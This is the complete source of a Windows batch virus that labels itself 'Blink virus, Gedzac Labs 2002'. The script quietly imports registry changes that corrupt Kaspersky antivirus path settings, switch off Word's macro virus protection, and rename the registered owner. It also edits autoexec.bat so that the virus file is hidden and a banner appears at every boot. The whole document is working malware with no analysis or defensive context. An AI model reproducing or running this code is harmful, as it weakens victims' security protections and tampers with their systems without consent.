@echo off
@break off
ctty nul
echo REGEDIT4 > %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg
echo "avpfolder"="Blink Folder" >> %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg
echo "VEDataFilePath"="The Blink Path" >> %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg
echo "VEIndexFilePath"="The Plink, the Blink, the Oink" >> %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg
echo "MainDir"="Blink virus & the Batch company" >> %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg
echo "Folder"="Plink it's the Blink guitarrist yeeeeeh!" >> %Windir%\blink.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options] >> %Windir%\blink.reg
echo "EnableMacroVirusProtection"="0" >> %Windir%\blink.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options] >> %Windir%\blink.reg
echo "EnableMacroVirusProtection"="0" >> %Windir%\blink.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion] >> %Windir%\blink.reg
echo "RegisteredOwner"="Blink" >> %Windir%\blink.reg
echo "RegisteredOrganization"="The Blink company inc." >> %Windir%\blink.reg
regedit /s /c %Windir%\blink.reg
ECHO @attrib +h +r c:\ThE MegA BlINk BaT.bat >> c:\autoexec.bat
ECHO cls >> c:\autoexec.bat
ECHO @ECHO --------------------- >> c:\autoexec.bat
ECHO @ECHO [ Blink virus.      ] >> c:\autoexec.bat      
ECHO @ECHO [ Gedzac Labs 2002. ] >> c:\autoexec.bat 
ECHO @ECHO --------------------- >> c:\autoexec.bat
ECHO @choice "" /c:12 /n /t:1,5 >> c:\autoexec.bat
ECHO @if errorlevel 1 goto fin >> c:\autoexec.bat
ECHO :fin >> c:\autoexec.bat
exit